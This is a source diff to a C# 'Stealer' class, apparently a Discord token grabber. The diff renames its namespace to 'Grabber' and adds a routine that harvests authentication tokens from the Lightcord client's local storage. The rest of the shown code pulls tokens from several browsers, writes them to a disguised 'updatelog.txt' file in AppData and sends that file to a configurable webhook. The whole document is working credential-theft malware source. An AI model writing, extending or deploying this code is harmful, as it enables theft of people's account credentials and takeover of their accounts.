@@ -1,4 +1,4 @@
-﻿
+
 /*
   Class made by Misakiii
   https://github.com/Miisaakii
@@ -24,13 +24,13 @@ using System.Windows.Forms;
 
 #endregion
 
-namespace DC
+namespace Grabber
 {
     #region "Stealer Class"
 
     public class Stealer
     {
-		public static string Hook = "YOUR WEBHOOK URL";
+		public static string Hook = "WEBHOOK_URL";
 
 		private static string _path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\updatelog.txt";
 
@@ -42,6 +42,7 @@ namespace DC
 		private static bool Brave = false;
 		private static bool Yandex = false;
 		private static bool OperaGX = false;
+		private static bool Lightcord = false;
 
 		private static bool Firefox = false;
 		private static bool StealFound;
@@ -78,7 +79,9 @@ namespace DC
 			}
 			catch
 			{
+
 			}
+
 			list = list.Distinct<string>().ToList<string>();
 			if (list.Count > 0)
 			{
@@ -96,6 +99,8 @@ namespace DC
 			Stealer.Yandex = false;
 			Stealer.Canary = false;
 			Stealer.OperaGX = false;
+			Stealer.Lightcord = false;
+
 			return list;
 		}
 
@@ -135,6 +140,10 @@ namespace DC
 				else if (Stealer.OperaGX)
 				{
 					text = "Opera GX";
+				}
+				else if (Stealer.Lightcord)
+				{
+					text = "Lightcord";
 				}
 				else
 				{
@@ -219,6 +228,7 @@ namespace DC
 				Stealer.StealTokenFromBraveBrowser();
 				Stealer.StealTokenFromYandexBrowser();
 				Stealer.StealTokenFromFirefox();
+				Stealer.StealTokenFromLightcord();
 
 				Stealer.Send(File.ReadAllText(Stealer._path));
 
@@ -304,6 +314,22 @@ namespace DC
 				}
 			}
 		}
+
+		private static void StealTokenFromLightcord()
+		{
+			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Lightcord\\Local Storage\\leveldb\\";
+			DirectoryInfo folder = new DirectoryInfo(path);
+			if (Directory.Exists(path))
+			{
+				Stealer.Lightcord = true;
+				List<string> list = Stealer.TokenStealer(folder, false);
+				if (list != null && list.Count > 0)
+				{
+					Stealer.Lightcord = true;
+				}
+			}
+		}
+
 		private static void StealTokenFromBraveBrowser()
 		{
 			string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\";
